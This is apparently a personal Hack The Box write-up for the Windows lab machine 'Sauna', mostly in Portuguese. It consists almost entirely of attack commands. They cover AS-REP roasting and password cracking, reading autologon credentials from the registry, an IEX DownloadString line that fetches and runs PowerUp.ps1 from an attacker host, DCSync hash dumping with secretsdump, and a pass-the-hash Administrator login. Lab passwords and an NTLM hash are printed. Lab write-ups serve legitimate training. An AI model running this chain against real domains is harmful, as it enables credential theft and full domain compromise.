Sauna
========================

# Enumeration

    sudo nmap_enum sauna.htb | tee nmap_output.txt
    
Anonymous login success

    smbclient -L //10.10.10.175
    
    smbclient -L //10.10.10.175 -U '' -N
 
    cewl http://sauna.htb/about.html
    
Daí eu adicionei alguns usuários na mão em uma lista de possíveis usuários da máquina:

Fui buscar o nome de domínio:

    enum4linux -a 10.10.10.175

![qownnotes-media-YbJpFr](../../../media/qownnotes-media-YbJpFr.png)



    kerbrute userenum -d EGOTISTICALBANK --dc 10.10.10.175 users_temp.txt
    
    
![qownnotes-media-IEyYLp](../../../media/qownnotes-media-IEyYLp.png)

    
    impacket-GetNPUsers -dc-ip 10.10.10.175 EGOTISTICALBANK/ -usersfile users_temp.txt -format john -outputfile hashes
    
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

![qownnotes-media-MFhuAW](../../../media/qownnotes-media-MFhuAW.png)

    sudo ntpdate 10.10.10.175
    impacket-GetUserSPNs 'EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23' -dc-ip 10.10.10.175 -request
    
![qownnotes-media-owOpqO](../../../media/qownnotes-media-owOpqO.png)

# Exploitation

    evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
    
![qownnotes-media-cfRBMg](../../../media/qownnotes-media-cfRBMg.png)

# Privilege Escalation
  
## View privileges
    whoami /priv
    runas /user:EGOTISTICALBANK\hsmith powershell
    
## Systeminfo
    systeminfo

## Escalate normal
    Start-Process PowerShell -Verb RunAs
    
![qownnotes-media-LDTWkv](../../../media/qownnotes-media-LDTWkv.png)

![qownnotes-media-RlYirN](../../../media/qownnotes-media-RlYirN.png)

## Registry credentials
    (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName   
    
    (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
    
![qownnotes-media-JSoVvA](../../../media/qownnotes-media-JSoVvA.png)

Credenciais:

svc_loanmgr
Moneymakestheworldgoround!

    evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
    
    whoami /priv

![qownnotes-media-ZUxQFQ](../../../media/qownnotes-media-ZUxQFQ.png)

## See mounted volumes

    mountvol

## Running processes

    tasklist /svc
 
 ![qownnotes-media-qXBDiM](../../../media/qownnotes-media-qXBDiM.png)

## PowerUp.ps1

    IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8/4-privilege%20escalation/PowerUp.ps1'); invoke-allchecks

## SharpHound

    ./sh.exe -c all -d EGOTISTICALBANK --ldapusername svc_loanmgr --ldappassword "Moneymakestheworldgoround!"

Verificamos que o usuário possui os direitos de DCSync no domínio:


![qownnotes-media-rFkvLt](../../../media/qownnotes-media-rFkvLt.png)

![qownnotes-media-iLCxGH](../../../media/qownnotes-media-iLCxGH.png)


    impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

![qownnotes-media-WretYI](../../../media/qownnotes-media-WretYI.png)

    evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
 
 
 ![qownnotes-media-zenbWT](../../../media/qownnotes-media-zenbWT.png)
